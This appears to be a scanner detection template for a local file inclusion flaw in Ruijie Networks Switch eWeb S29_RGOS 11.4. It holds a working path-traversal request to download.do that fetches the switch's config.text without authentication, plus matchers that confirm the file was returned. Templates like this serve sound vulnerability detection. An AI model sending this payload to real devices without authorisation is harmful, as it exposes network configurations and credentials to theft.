id: ruijie-networks-lfi
brief:
    title: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
    by: pikpikcu
    level: high
    about: Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file inclusion and allows remote unauthenticated attackers to access locally stored files and retrieve their content via the 'downlo...
    label:
        - ruijie
        - lfi
        - edb
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/download.do?file=../../../../config.text'
      signs:
        - "on": word
          has:
            - filename="config.text"
            - 'Content-Type: application/octet-stream'
          in: header
          need: all
        - "on": word
          has:
            - version S29_RGOS 11.4
          in: body
          need: all
        - "on": status
          status:
            - 200
